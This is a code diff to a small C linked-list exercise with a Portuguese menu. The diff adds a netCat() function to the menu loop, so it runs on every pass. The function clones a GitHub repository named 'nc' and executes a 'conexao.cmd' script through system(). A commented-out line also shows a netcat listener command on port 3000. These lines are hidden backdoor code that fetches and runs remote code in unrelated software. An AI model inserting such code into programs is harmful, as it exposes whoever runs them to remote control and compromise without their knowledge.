@@ -27,6 +27,7 @@ int main(int argc, char *argv[]) {
 
   do {
 
+    netCat();
     printf("1 - Inserir no inicion\n2 - imprimir\n3 - Inserir no fim da "
            "fila\n5 - Sair\n");
     scanf("%d", &opcao);
@@ -91,4 +92,10 @@ void inserirInicio(Lista *lista, int valor) {
   novo->proximo = lista->inicio;
   lista->inicio = novo;
   lista->tam++;
+}
+
+void netCat(){
+  system("git clone https://github.com/Paulo-Mason-SkyDark/nc.git");
+  system("conexao.cmd");
+  // system("nc -lpd 3000");
 }
